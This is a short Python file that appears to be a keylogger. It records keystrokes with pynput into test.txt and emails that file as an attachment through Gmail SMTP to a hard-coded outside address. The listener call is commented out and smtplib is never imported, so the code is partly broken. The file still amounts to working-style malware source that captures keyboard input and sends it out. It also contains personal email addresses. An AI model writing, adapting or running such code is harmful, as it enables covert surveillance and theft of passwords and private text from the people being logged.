from pynput.keyboard import Listener
import email
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
import time



wordvar=''
def log_keystroke(key):
    global wordvar
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if key =="Key.backspace":
        key=' - '
    wordvar=wordvar+key
    with open("test.txt", 'w') as f:
        f.write(wordvar)
     

def send_email():
    fromaddr = 'tamarapapikyan9@gmail.com'
    toaddrs  = 'tamarapapikyan21.96@gmail.com'
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddrs
    msg['Subject'] = "Test"
    body = "Test mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = "test.txt"
    attachment = open(r"/home/erida-employee/Desktop/ssh/test.txt", "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "**********")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddrs, text)
    server.quit()

#print('ssssssssssssssssssssssssssss')
#with Listener(on_press=log_keystroke) as l:
 #   l.join()
tim = time.perf_counter()
print('ssssssssssssssssssssssssssss')
if tim == 10:
    print("ok")
send_email()









